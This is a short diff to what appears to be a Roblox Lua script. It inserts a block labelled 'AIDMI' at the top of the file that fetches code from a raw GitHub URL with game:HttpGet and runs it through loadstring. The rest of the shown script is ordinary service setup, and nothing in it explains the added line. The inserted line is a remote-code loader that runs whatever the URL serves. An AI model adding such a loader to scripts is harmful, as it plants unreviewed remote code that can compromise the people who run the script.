@@ -1,3 +1,10 @@
+
+-- ========
+-- AIDMI
+-- ======
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MUMUMU1548/Main/refs/heads/main/Admin%F0%9F%9F%A2"))()
+-- =========
+
 -- Services
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
